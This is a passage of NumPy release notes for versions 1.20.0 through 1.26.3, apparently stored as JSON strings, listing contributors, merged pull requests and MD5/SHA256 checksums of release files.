   82211490e9375bdad57592139b49184d  numpy-1.20.0-cp37-cp37m-manylinux2010_x86_64.whl\n    b2d47be4aa123623b39f18723e0d70b7  numpy-1.20.0-cp37-cp37m-manylinux2014_aarch64.whl\n    e884b218dc2b20895f57fae00534e8ea  numpy-1.20.0-cp37-cp37m-win32.whl\n    ec8265d429e808d8f92ed46711d66bc7  numpy-1.20.0-cp37-cp37m-win_amd64.whl\n    791cc5086a755929a1140018067c4587  numpy-1.20.0-cp38-cp38-macosx_10_9_x86_64.whl\n    2ee146bad9aa521d0bdfd7e30e982a80  numpy-1.20.0-cp38-cp38-manylinux1_i686.whl\n    83d74204a26e9dd3cb93653818745d09  numpy-1.20.0-cp38-cp38-manylinux1_x86_64.whl\n    0b0a5e36d4b75a00603cec4db09c44d7  numpy-1.20.0-cp38-cp38-manylinux2010_i686.whl\n    c192aeac728a3abfbd16daef87b2a307  numpy-1.20.0-cp38-cp38-manylinux2010_x86_64.whl\n    2282da14106cb52bbf9c8c0b847c3480  numpy-1.20.0-cp38-cp38-manylinux2014_aarch64.whl\n    0e0e4bf53dd8ea4e232083e788419f30  numpy-1.20.0-cp38-cp38-win32.whl\n    93ebb884970cf7292778cb19e9f27596  numpy-1.20.0-cp38-cp38-win_amd64.whl\n    749cca75b33849a78e7238aeb09baded  numpy-1.20.0-cp39-cp39-macosx_10_9_x86_64.whl\n    e36e7e259bb38ccd2320f88a137115e0  numpy-1.20.0-cp39-cp39-manylinux2010_i686.whl\n    4979a98a2cf0a1b14a82630b717aa12b  numpy-1.20.0-cp39-cp39-manylinux2010_x86_64.whl\n    52a78d15f15959003047ccb6b66a0ee7  numpy-1.20.0-cp39-cp39-manylinux2014_aarch64.whl\n    796b273028c7724a855214ae9a83e4f8  numpy-1.20.0-cp39-cp39-win32.whl\n    663428d8bedc5785041800ce098368cd  numpy-1.20.0-cp39-cp39-win_amd64.whl\n    66ea4e7911de7fdce688c1b69f9c7c54  numpy-1.20.0-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    fc7c970084438911a50efaa8cddccebc  numpy-1.20.0.tar.gz\n    024eb99dba56c3021458caf86f2fea0a  numpy-1.20.0.zip\n\nSHA256\n------\n::\n\n    89bd70c9ad540febe6c28451ba225eb4e49d27f64728357f512c808002325dfa  numpy-1.20.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    1264c66129f5ef63187649dd43f1ca59532e8c098723643336a85131c0dcce3f  numpy-1.20.0-cp37-cp37m-manylinux1_i686.whl\n    e9c5fd330d2fedf06051bafb996252de9b032fcb2ec03eefc9a543e56efa66d4  numpy-1.20.0-cp37-cp37m-manylinux1_x86_64.whl\n    db5e69d08756a2fa75a42b4e433880b6187768fe1bc73d21819def893e5128c6  numpy-1.20.0-cp37-cp37m-manylinux2010_i686.whl\n    1abc02e30e3efd81a4571e00f8e62bf42e343c76698e0a3e11d9c2b3ee0d77a7  numpy-1.20.0-cp37-cp37m-manylinux2010_x86_64.whl\n    5ae765dd29c71a555f8102281f6fb15a3f4dbd35f6e7daf36af9df6d9dd716a5  numpy-1.20.0-cp37-cp37m-manylinux2014_aarch64.whl\n    b51b9ef0624f4b01b846c981034c10d2e30db33f9f8be71e992f3900741f6f77  numpy-1.20.0-cp37-cp37m-win32.whl\n    afeee581b50df20ef07b736e62ca612858f1fcdba96651d26ab44e3d567a4e6e  numpy-1.20.0-cp37-cp37m-win_amd64.whl\n    2bf0e68c92ef077fe766e53f8937d8ac341bdbca68ec128ae049b7d5c34e3206  numpy-1.20.0-cp38-cp38-macosx_10_9_x86_64.whl\n    2445a96fbae23a4109c61be0f0af0f3bc273905dc5687a710850c1dfde0fc994  numpy-1.20.0-cp38-cp38-manylinux1_i686.whl\n    33edfc0eb229f86f539493917b34035054313a11afbed48404aaf9f86bf4b0f6  numpy-1.20.0-cp38-cp38-manylinux1_x86_64.whl\n    894aaee60043a98b03f0ad992c810f62e3a15f98a701e1c0f58a4f4a0df13429  numpy-1.20.0-cp38-cp38-manylinux2010_i686.whl\n    b66a6c15d793eda7cdad986e737775aa31b9306d588c14dd0277d2dda5546150  numpy-1.20.0-cp38-cp38-manylinux2010_x86_64.whl\n    eee454d3aa3955d0c0069a0f265fea47f1e1384c35a110a95efed358eb6e1562  numpy-1.20.0-cp38-cp38-manylinux2014_aarch64.whl\n    abdfa075e293d73638ece434708aa60b510dc6e70d805f57f481a0f550b25a9e  numpy-1.20.0-cp38-cp38-win32.whl\n    f1e9424e9aa3834ea27cc12f9c6ea8ace5da18ee60a720bb3a85b2f733f41782  numpy-1.20.0-cp38-cp38-win_amd64.whl\n    cb257bb0c0a3176c32782a63cfab2eace7eabfa2a3b2dfd85a13700617ccaf28  numpy-1.20.0-cp39-cp39-macosx_10_9_x86_64.whl\n    cf5d9dcbdbe523fa665c5309cce5f144648d94a7fddbf5a40f8e0d5c9f5b596d  numpy-1.20.0-cp39-cp39-manylinux2010_i686.whl\n    93c2abea7bb69f47029b84ceac30ab46dfcfdb99b671ad850a333ff794a765e4  numpy-1.20.0-cp39-cp39-manylinux2010_x86_64.whl\n    0d28a54afcf46f1f9ebd163e49ad6b49087f22986fefd01a23ca0c1cdda25ca6  numpy-1.20.0-cp39-cp39-manylinux2014_aarch64.whl\n    d1bc331e1706fd1809a1bc8a31205329e5b30cf5ba50461c624da267e99f6ae6  numpy-1.20.0-cp39-cp39-win32.whl\n    e3db646af9f6a145f0c57202f4b55d4a33f975e395e78fb7b394644c17c1a3a6  numpy-1.20.0-cp39-cp39-win_amd64.whl\n    4d592264d2a4f368afbb4288b5ceb646d4cbaf559c0249c096fbb0a149806b90  numpy-1.20.0-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    67b630745a71b541ff6517d6f3d62b00690dc8ba0684cad0d7b0ac55aec1de53  numpy-1.20.0.tar.gz\n    3d8233c03f116d068d5365fed4477f2947c7229582dad81e5953088989294cec  numpy-1.20.0.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.20.2": "==========================\n\nNumPy 1,20.2 is a bugfix release containing several fixes merged to the main\nbranch after the NumPy 1.20.1 release.\n\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Allan Haldane\n* Bas van Beek\n* Charles Harris\n* Christoph Gohlke\n* Mateusz Sok\u00f3\u0142 +\n* Michael Lamparski\n* Sebastian Berg\n\nPull requests merged\n====================\n\nA total of 20 pull requests were merged for this release.\n\n* `18382 <https://github.com/numpy/numpy/pull/18382>`__: MAINT: Update f2py from master.\n* `18459 <https://github.com/numpy/numpy/pull/18459>`__: BUG: ``diagflat`` could overflow on windows or 32-bit platforms\n* `18460 <https://github.com/numpy/numpy/pull/18460>`__: BUG: Fix refcount leak in f2py ``complex_double_from_pyobj``.\n* `18461 <https://github.com/numpy/numpy/pull/18461>`__: BUG: Fix tiny memory leaks when ``like=`` overrides are used\n* `18462 <https://github.com/numpy/numpy/pull/18462>`__: BUG: Remove temporary change of descr/flags in VOID functions\n* `18469 <https://github.com/numpy/numpy/pull/18469>`__: BUG: Segfault in nditer buffer dealloc for Object arrays\n* `18485 <https://github.com/numpy/numpy/pull/18485>`__: BUG: Remove suspicious type casting\n* `18486 <https://github.com/numpy/numpy/pull/18486>`__: BUG: remove nonsensical comparison of pointer < 0\n* `18487 <https://github.com/numpy/numpy/pull/18487>`__: BUG: verify pointer against NULL before using it\n* `18488 <https://github.com/numpy/numpy/pull/18488>`__: BUG: check if PyArray_malloc succeeded\n* `18546 <https://github.com/numpy/numpy/pull/18546>`__: BUG: incorrect error fallthrough in nditer\n* `18559 <https://github.com/numpy/numpy/pull/18559>`__: CI: Backport CI fixes from main.\n* `18599 <https://github.com/numpy/numpy/pull/18599>`__: MAINT: Add annotations for `dtype.__getitem__`, `__mul__` and...\n* `18611 <https://github.com/numpy/numpy/pull/18611>`__: BUG: NameError in numpy.distutils.fcompiler.compaq\n* `18612 <https://github.com/numpy/numpy/pull/18612>`__: BUG: Fixed ``where`` keyword for ``np.mean`` & ``np.var`` methods\n* `18617 <https://github.com/numpy/numpy/pull/18617>`__: CI: Update apt package list before Python install\n* `18636 <https://github.com/numpy/numpy/pull/18636>`__: MAINT: Ensure that re-exported sub-modules are properly annotated\n* `18638 <https://github.com/numpy/numpy/pull/18638>`__: BUG: Fix ma coercion list-of-ma-arrays if they do not cast to...\n* `18661 <https://github.com/numpy/numpy/pull/18661>`__: BUG: Fix small valgrind-found issues\n* `18671 <https://github.com/numpy/numpy/pull/18671>`__: BUG: Fix small issues found with pytest-leaks\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    a95718df123e0726a7dac5043050b251  numpy-1.20.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    4cacfe903c60827c0e44d0bed7e3a760  numpy-1.20.2-cp37-cp37m-manylinux1_i686.whl\n    2879728d4f815f07c7d133347deefe45  numpy-1.20.2-cp37-cp37m-manylinux1_x86_64.whl\n    97546a3cf4ddcc9fcc7eb41b9558f1de  numpy-1.20.2-cp37-cp37m-manylinux2010_i686.whl\n    65ffbc38abe1c1b92eb3bebf3484f679  numpy-1.20.2-cp37-cp37m-manylinux2010_x86_64.whl\n    5746efbd42db03518a51adbacbc70fa7  numpy-1.20.2-cp37-cp37m-manylinux2014_aarch64.whl\n    e9b8e30a5c62f003835b374dbc1c9031  numpy-1.20.2-cp37-cp37m-win32.whl\n    b2d0fa9383776ab68a1bbefc84331fc1  numpy-1.20.2-cp37-cp37m-win_amd64.whl\n    321aa118fbd40fe53a7c82557f3f2772  numpy-1.20.2-cp38-cp38-macosx_10_9_x86_64.whl\n    518013677b05371bbe7e1d6fa4ef61aa  numpy-1.20.2-cp38-cp38-manylinux1_i686.whl\n    58c61ea025646c391788f7bc7f681fa5  numpy-1.20.2-cp38-cp38-manylinux1_x86_64.whl\n    e8ce1857f017bffeed46b003a0385b11  numpy-1.20.2-cp38-cp38-manylinux2010_i686.whl\n    8ed52b7194b0953d0b04b88fbabea1ac  numpy-1.20.2-cp38-cp38-manylinux2010_x86_64.whl\n    0a9202dfd47fb02c8eab9f71f084633c  numpy-1.20.2-cp38-cp38-manylinux2014_aarch64.whl\n    8c70e309be1ae43d2938895b56ffbdb7  numpy-1.20.2-cp38-cp38-win32.whl\n    8aaa91a51b79556643ad93cb1d55b7d3  numpy-1.20.2-cp38-cp38-win_amd64.whl\n    b1b03999df657ccd4e65ff6abcf7e042  numpy-1.20.2-cp39-cp39-macosx_10_9_x86_64.whl\n    139fef5109539031e570aee9aa3090bf  numpy-1.20.2-cp39-cp39-manylinux2010_i686.whl\n    2c9463187e6a1a0245ed4a2db8e8e656  numpy-1.20.2-cp39-cp39-manylinux2010_x86_64.whl\n    b6cb08e8f56accedc4fdc29720ffb380  numpy-1.20.2-cp39-cp39-manylinux2014_aarch64.whl\n    a3024059b52e7688d3c98b82e2f2688e  numpy-1.20.2-cp39-cp39-win32.whl\n    abcd17ffd3b29014ff15e93a74c2c3d6  numpy-1.20.2-cp39-cp39-win_amd64.whl\n    67704047e60c2b280f7e9f42400cca91  numpy-1.20.2-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    6fe93791438f9c1f69c9352680151002  numpy-1.20.2.tar.gz\n    5e1b381630af4d18db0fedd56b6d8da2  numpy-1.20.2.zip\n\nSHA256\n------\n::\n\n    e9459f40244bb02b2f14f6af0cd0732791d72232bbb0dc4bab57ef88e75f6935  numpy-1.20.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    a8e6859913ec8eeef3dbe9aed3bf475347642d1cdd6217c30f28dee8903528e6  numpy-1.20.2-cp37-cp37m-manylinux1_i686.whl\n    9cab23439eb1ebfed1aaec9cd42b7dc50fc96d5cd3147da348d9161f0501ada5  numpy-1.20.2-cp37-cp37m-manylinux1_x86_64.whl\n    9c0fab855ae790ca74b27e55240fe4f2a36a364a3f1ebcfd1fb5ac4088f1cec3  numpy-1.20.2-cp37-cp37m-manylinux2010_i686.whl\n    61d5b4cf73622e4d0c6b83408a16631b670fc045afd6540679aa35591a17fe6d  numpy-1.20.2-cp37-cp37m-manylinux2010_x86_64.whl\n    d15007f857d6995db15195217afdbddfcd203dfaa0ba6878a2f580eaf810ecd6  numpy-1.20.2-cp37-cp37m-manylinux2014_aarch64.whl\n    d76061ae5cab49b83a8cf3feacefc2053fac672728802ac137dd8c4123397677  numpy-1.20.2-cp37-cp37m-win32.whl\n    bad70051de2c50b1a6259a6df1daaafe8c480ca98132da98976d8591c412e737  numpy-1.20.2-cp37-cp37m-win_amd64.whl\n    719656636c48be22c23641859ff2419b27b6bdf844b36a2447cb39caceb00935  numpy-1.20.2-cp38-cp38-macosx_10_9_x86_64.whl\n    aa046527c04688af680217fffac61eec2350ef3f3d7320c07fd33f5c6e7b4d5f  numpy-1.20.2-cp38-cp38-manylinux1_i686.whl\n    2428b109306075d89d21135bdd6b785f132a1f5a3260c371cee1fae427e12727  numpy-1.20.2-cp38-cp38-manylinux1_x86_64.whl\n    e8e4fbbb7e7634f263c5b0150a629342cc19b47c5eba8d1cd4363ab3455ab576  numpy-1.20.2-cp38-cp38-manylinux2010_i686.whl\n    edb1f041a9146dcf02cd7df7187db46ab524b9af2515f392f337c7cbbf5b52cd  numpy-1.20.2-cp38-cp38-manylinux2010_x86_64.whl\n    c73a7975d77f15f7f68dacfb2bca3d3f479f158313642e8ea9058eea06637931  numpy-1.20.2-cp38-cp38-manylinux2014_aarch64.whl\n    6c915ee7dba1071554e70a3664a839fbc033e1d6528199d4621eeaaa5487ccd2  numpy-1.20.2-cp38-cp38-win32.whl\n    471c0571d0895c68da309dacee4e95a0811d0a9f9f532a48dc1bea5f3b7ad2b7  numpy-1.20.2-cp38-cp38-win_amd64.whl\n    4703b9e937df83f5b6b7447ca5912b5f5f297aba45f91dbbbc63ff9278c7aa98  numpy-1.20.2-cp39-cp39-macosx_10_9_x86_64.whl\n    abc81829c4039e7e4c30f7897938fa5d4916a09c2c7eb9b244b7a35ddc9656f4  numpy-1.20.2-cp39-cp39-manylinux2010_i686.whl\n    377751954da04d4a6950191b20539066b4e19e3b559d4695399c5e8e3e683bf6  numpy-1.20.2-cp39-cp39-manylinux2010_x86_64.whl\n    6e51e417d9ae2e7848314994e6fc3832c9d426abce9328cf7571eefceb43e6c9  numpy-1.20.2-cp39-cp39-manylinux2014_aarch64.whl\n    780ae5284cb770ade51d4b4a7dce4faa554eb1d88a56d0e8b9f35fca9b0270ff  numpy-1.20.2-cp39-cp39-win32.whl\n    924dc3f83de20437de95a73516f36e09918e9c9c18d5eac520062c49191025fb  numpy-1.20.2-cp39-cp39-win_amd64.whl\n    97ce8b8ace7d3b9288d88177e66ee75480fb79b9cf745e91ecfe65d91a856042  numpy-1.20.2-pp37-pypy37_pp73-manylinux2010_x86_64.whl\n    c049f410c78e76ffb0af830a8afbdf8baac09897b4152b97b1a3b8345ee338ff  numpy-1.20.2.tar.gz\n    878922bf5ad7550aa044aa9301d417e2d3ae50f0f577de92051d739ac6096cee  numpy-1.20.2.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.23.4": "==========================\nNumPy 1.23.4 is a maintenance release that fixes bugs discovered after the\n1.23.3 release and keeps the build infrastructure current. The main\nimprovements are fixes for some annotation corner cases, a fix for a long time\n``nested_iters`` memory leak, and a fix of complex vector dot for very large\narrays. The Python versions supported for this release are 3.8-3.11.\n\nNote that the mypy version needs to be 0.981+ if you test using Python 3.10.7,\notherwise the typing tests will fail.\n\nContributors\n============\n\nA total of 8 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Bas van Beek\n* Charles Harris\n* Matthew Barber\n* Matti Picus\n* Ralf Gommers\n* Ross Barnowski\n* Sebastian Berg\n* Sicheng Zeng +\n\nPull requests merged\n====================\n\nA total of 13 pull requests were merged for this release.\n\n* `22368 <https://github.com/numpy/numpy/pull/22368>`__: BUG: Add ``__array_api_version__`` to ``numpy.array_api`` namespace\n* `22370 <https://github.com/numpy/numpy/pull/22370>`__: MAINT: update sde toolkit to 9.0, fix download link\n* `22382 <https://github.com/numpy/numpy/pull/22382>`__: BLD: use macos-11 image on azure, macos-1015 is deprecated\n* `22383 <https://github.com/numpy/numpy/pull/22383>`__: MAINT: random: remove ``get_info`` from \"extending with Cython\"...\n* `22384 <https://github.com/numpy/numpy/pull/22384>`__: BUG: Fix complex vector dot with more than NPY_CBLAS_CHUNK elements\n* `22387 <https://github.com/numpy/numpy/pull/22387>`__: REV: Loosen ``lookfor``'s import try/except again\n* `22388 <https://github.com/numpy/numpy/pull/22388>`__: TYP,ENH: Mark ``numpy.typing`` protocols as runtime checkable\n* `22389 <https://github.com/numpy/numpy/pull/22389>`__: TYP,MAINT: Change more overloads to play nice with pyright\n* `22390 <https://github.com/numpy/numpy/pull/22390>`__: TST,TYP: Bump mypy to 0.981\n* `22391 <https://github.com/numpy/numpy/pull/22391>`__: DOC: Update delimiter param description.\n* `22392 <https://github.com/numpy/numpy/pull/22392>`__: BUG: Memory leaks in numpy.nested_iters\n* `22413 <https://github.com/numpy/numpy/pull/22413>`__: REL: Prepare for the NumPy 1.23.4 release.\n* `22424 <https://github.com/numpy/numpy/pull/22424>`__: TST: Fix failing aarch64 wheel builds.\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    90a3d95982490cfeeef22c0f7cbd874f  numpy-1.23.4-cp310-cp310-macosx_10_9_x86_64.whl\n    c3cae63394db6c82fd2cb5700fc5917d  numpy-1.23.4-cp310-cp310-macosx_11_0_arm64.whl\n    b3ff0878de205f56c38fd7dcab80081f  numpy-1.23.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    e2b086ca2229209f2f996c2f9a38bf9c  numpy-1.23.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    44cc8bb112ca737520cf986fff92dfb0  numpy-1.23.4-cp310-cp310-win32.whl\n    21c8e5fdfba2ff953e446189379cf0c9  numpy-1.23.4-cp310-cp310-win_amd64.whl\n    27445a9c85977cb8efa682a4b993347f  numpy-1.23.4-cp311-cp311-macosx_10_9_x86_64.whl\n    11ef4b7dfdaa37604cb881f3ca4459db  numpy-1.23.4-cp311-cp311-macosx_11_0_arm64.whl\n    b3c77344274f91514f728a454fd471fa  numpy-1.23.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    43aef7f984cd63d95c11fb74dd59ef0b  numpy-1.23.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    637fe21b585228c9670d6e002bf8047f  numpy-1.23.4-cp311-cp311-win32.whl\n    f529edf9b849d6e3b8cdb5120ae5b81a  numpy-1.23.4-cp311-cp311-win_amd64.whl\n    76c61ce36317a7e509663829c6844fd9  numpy-1.23.4-cp38-cp38-macosx_10_9_x86_64.whl\n    2133f6893eef41cd9331c7d0271044c4  numpy-1.23.4-cp38-cp38-macosx_11_0_arm64.whl\n    5ccb3aa6fb8cb9e20ec336e315d01dec  numpy-1.23.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    da71f34a4df0b98e4d9e17906dd57b07  numpy-1.23.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a318978f51fb80a17c2381e39194e906  numpy-1.23.4-cp38-cp38-win32.whl\n    eac810d6bc43830bf151ea55cd0ded93  numpy-1.23.4-cp38-cp38-win_amd64.whl\n    4cf0a6007abe42564c7380dbf92a26ce  numpy-1.23.4-cp39-cp39-macosx_10_9_x86_64.whl\n    2e005bedf129ce8bafa6f550537f3740  numpy-1.23.4-cp39-cp39-macosx_11_0_arm64.whl\n    10aa210311fcd19a03f6c5495824a306  numpy-1.23.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6301298a67999657a0878b64eeed09f2  numpy-1.23.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    76144e575a3c3863ea22e03cdf022d8a  numpy-1.23.4-cp39-cp39-win32.whl\n    8291dd66ef5451b4db2da55c21535757  numpy-1.23.4-cp39-cp39-win_amd64.whl\n    7cc095b18690071828b5b620d5ec40e7  numpy-1.23.4-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    63742f15e8bfa215c893136bbfc6444f  numpy-1.23.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4ed382e55abc09c89a34db047692f6a6  numpy-1.23.4-pp38-pypy38_pp73-win_amd64.whl\n    d9ffd2c189633486ec246e61d4b947a0  numpy-1.23.4.tar.gz\n\nSHA256\n------\n::\n\n    95d79ada05005f6f4f337d3bb9de8a7774f259341c70bc88047a1f7b96a4bcb2  numpy-1.23.4-cp310-cp310-macosx_10_9_x86_64.whl\n    926db372bc4ac1edf81cfb6c59e2a881606b409ddc0d0920b988174b2e2a767f  numpy-1.23.4-cp310-cp310-macosx_11_0_arm64.whl\n    c237129f0e732885c9a6076a537e974160482eab8f10db6292e92154d4c67d71  numpy-1.23.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a8365b942f9c1a7d0f0dc974747d99dd0a0cdfc5949a33119caf05cb314682d3  numpy-1.23.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2341f4ab6dba0834b685cce16dad5f9b6606ea8a00e6da154f5dbded70fdc4dd  numpy-1.23.4-cp310-cp310-win32.whl\n    d331afac87c92373826af83d2b2b435f57b17a5c74e6268b79355b970626e329  numpy-1.23.4-cp310-cp310-win_amd64.whl\n    488a66cb667359534bc70028d653ba1cf307bae88eab5929cd707c761ff037db  numpy-1.23.4-cp311-cp311-macosx_10_9_x86_64.whl\n    ce03305dd694c4873b9429274fd41fc7eb4e0e4dea07e0af97a933b079a5814f  numpy-1.23.4-cp311-cp311-macosx_11_0_arm64.whl\n    8981d9b5619569899666170c7c9748920f4a5005bf79c72c07d08c8a035757b0  numpy-1.23.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7a70a7d3ce4c0e9284e92285cba91a4a3f5214d87ee0e95928f3614a256a1488  numpy-1.23.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5e13030f8793e9ee42f9c7d5777465a560eb78fa7e11b1c053427f2ccab90c79  numpy-1.23.4-cp311-cp311-win32.whl\n    7607b598217745cc40f751da38ffd03512d33ec06f3523fb0b5f82e09f6f676d  numpy-1.23.4-cp311-cp311-win_amd64.whl\n    7ab46e4e7ec63c8a5e6dbf5c1b9e1c92ba23a7ebecc86c336cb7bf3bd2fb10e5  numpy-1.23.4-cp38-cp38-macosx_10_9_x86_64.whl\n    a8aae2fb3180940011b4862b2dd3756616841c53db9734b27bb93813cd79fce6  numpy-1.23.4-cp38-cp38-macosx_11_0_arm64.whl\n    8c053d7557a8f022ec823196d242464b6955a7e7e5015b719e76003f63f82d0f  numpy-1.23.4-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a0882323e0ca4245eb0a3d0a74f88ce581cc33aedcfa396e415e5bba7bf05f68  numpy-1.23.4-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    dada341ebb79619fe00a291185bba370c9803b1e1d7051610e01ed809ef3a4ba  numpy-1.23.4-cp38-cp38-win32.whl\n    0fe563fc8ed9dc4474cbf70742673fc4391d70f4363f917599a7fa99f042d5a8  numpy-1.23.4-cp38-cp38-win_amd64.whl\n    c67b833dbccefe97cdd3f52798d430b9d3430396af7cdb2a0c32954c3ef73894  numpy-1.23.4-cp39-cp39-macosx_10_9_x86_64.whl\n    f76025acc8e2114bb664294a07ede0727aa75d63a06d2fae96bf29a81747e4a7  numpy-1.23.4-cp39-cp39-macosx_11_0_arm64.whl\n    12ac457b63ec8ded85d85c1e17d85efd3c2b0967ca39560b307a35a6703a4735  numpy-1.23.4-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    95de7dc7dc47a312f6feddd3da2500826defdccbc41608d0031276a24181a2c0  numpy-1.23.4-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f2f390aa4da44454db40a1f0201401f9036e8d578a25f01a6e237cea238337ef  numpy-1.23.4-cp39-cp39-win32.whl\n    f260da502d7441a45695199b4e7fd8ca87db659ba1c78f2bbf31f934fe76ae0e  numpy-1.23.4-cp39-cp39-win_amd64.whl\n    61be02e3bf810b60ab74e81d6d0d36246dbfb644a462458bb53b595791251911  numpy-1.23.4-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    296d17aed51161dbad3c67ed6d164e51fcd18dbcd5dd4f9d0a9c6055dce30810  numpy-1.23.4-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    4d52914c88b4930dafb6c48ba5115a96cbab40f45740239d9f4159c4ba779962  numpy-1.23.4-pp38-pypy38_pp73-win_amd64.whl\n    ed2cc92af0efad20198638c69bb0fc2870a58dabfba6eb722c933b48556c686c  numpy-1.23.4.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.26.3": "==========================\n\nNumPy 1.26.3 is a maintenance release that fixes bugs and regressions\ndiscovered after the 1.26.2 release. The most notable changes are the f2py bug\nfixes. The Python versions supported by this release are 3.9-3.12.\n\n\nCompatibility\n=============\n\n``f2py`` will no longer accept ambiguous ``-m`` and ``.pyf`` CLI combinations.\nWhen more than one ``.pyf`` file is passed, an error is raised. When both ``-m``\nand a ``.pyf`` is passed, a warning is emitted and the ``-m`` provided name is\nignored.\n\n\nImprovements\n============\n\n``f2py`` now handles ``common`` blocks which have ``kind`` specifications from\nmodules. This further expands the usability of intrinsics like\n``iso_fortran_env`` and ``iso_c_binding``.\n\n\nContributors\n============\n\nA total of 18 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* DWesl\n* Illviljan\n* Alexander Grund\n* Andrea Bianchi +\n* Charles Harris\n* Daniel Vanzo\n* Johann Rohwer +\n* Matti Picus\n* Nathan Goldbaum\n* Peter Hawkins\n* Raghuveer Devulapalli\n* Ralf Gommers\n* Rohit Goswami\n* Sayed Adel\n* Sebastian Berg\n* Stefano Rivera +\n* Thomas A Caswell\n* matoro\n\n\nPull requests merged\n====================\nA total of 42 pull requests were merged for this release.\n\n* `25130 <https://github.com/numpy/numpy/pull/25130>`__: MAINT: prepare 1.26.x for further development\n* `25188 <https://github.com/numpy/numpy/pull/25188>`__: TYP: add None to ``__getitem__`` in ``numpy.array_api``\n* `25189 <https://github.com/numpy/numpy/pull/25189>`__: BLD,BUG: quadmath required where available [f2py]\n* `25190 <https://github.com/numpy/numpy/pull/25190>`__: BUG: alpha doesn't use REAL(10)\n* `25191 <https://github.com/numpy/numpy/pull/25191>`__: BUG: Fix FP overflow error in division when the divisor is scalar\n* `25192 <https://github.com/numpy/numpy/pull/25192>`__: MAINT: Pin scipy-openblas version.\n* `25201 <https://github.com/numpy/numpy/pull/25201>`__: BUG: Fix f2py to enable use of string optional inout argument\n* `25202 <https://github.com/numpy/numpy/pull/25202>`__: BUG: Fix -fsanitize=alignment issue in numpy/_core/src/multiarray/arraytypes.c.src\n* `25203 <https://github.com/numpy/numpy/pull/25203>`__: TST: Explicitly pass NumPy path to cython during tests (also...\n* `25204 <https://github.com/numpy/numpy/pull/25204>`__: BUG: fix issues with ``newaxis`` and ``linalg.solve`` in ``numpy.array_api``\n* `25205 <https://github.com/numpy/numpy/pull/25205>`__: BUG: Disallow shadowed modulenames\n* `25217 <https://github.com/numpy/numpy/pull/25217>`__: BUG: Handle common blocks with kind specifications from modules\n* `25218 <https://github.com/numpy/numpy/pull/25218>`__: BUG: Fix moving compiled executable to root with f2py -c on Windows\n* `25219 <https://github.com/numpy/numpy/pull/25219>`__: BUG: Fix single to half-precision conversion on PPC64/VSX3\n* `25227 <https://github.com/numpy/numpy/pull/25227>`__: TST: f2py: fix issue in test skip condition\n* `25240 <https://github.com/numpy/numpy/pull/25240>`__: Revert \"MAINT: Pin scipy-openblas version.\"\n* `25249 <https://github.com/numpy/numpy/pull/25249>`__: MAINT: do not use ``long`` type\n* `25377 <https://github.com/numpy/numpy/pull/25377>`__: TST: PyPy needs another gc.collect on latest versions\n* `25378 <https://github.com/numpy/numpy/pull/25378>`__: CI: Install Lapack runtime on Cygwin.\n* `25379 <https://github.com/numpy/numpy/pull/25379>`__: MAINT: Bump conda-incubator/setup-miniconda from 2.2.0 to 3.0.1\n* `25380 <https://github.com/numpy/numpy/pull/25380>`__: BLD: update vendored Meson for AIX shared library fix\n* `25419 <https://github.com/numpy/numpy/pull/25419>`__: MAINT: Init ``base`` in cpu_avx512_kn\n* `25420 <https://github.com/numpy/numpy/pull/25420>`__: BUG: Fix failing test_features on SapphireRapids\n* `25422 <https://github.com/numpy/numpy/pull/25422>`__: BUG: Fix non-contiguous memory load when ARM/Neon is enabled\n* `25428 <https://github.com/numpy/numpy/pull/25428>`__: MAINT,BUG: Never import distutils above 3.12 [f2py]\n* `25452 <https://github.com/numpy/numpy/pull/25452>`__: MAINT: make the import-time check for old Accelerate more specific\n* `25458 <https://github.com/numpy/numpy/pull/25458>`__: BUG: fix macOS version checks for Accelerate support\n* `25465 <https://github.com/numpy/numpy/pull/25465>`__: MAINT: Bump actions/setup-node and larsoner/circleci-artifacts-redirector-action\n* `25466 <https://github.com/numpy/numpy/pull/25466>`__: BUG: avoid seg fault from OOB access in RandomState.set_state()\n* `25467 <https://github.com/numpy/numpy/pull/25467>`__: BUG: Fix two errors related to not checking for failed allocations\n* `25468 <https://github.com/numpy/numpy/pull/25468>`__: BUG: Fix regression with ``f2py`` wrappers when modules and subroutines...\n* `25475 <https://github.com/numpy/numpy/pull/25475>`__: BUG: Fix build issues 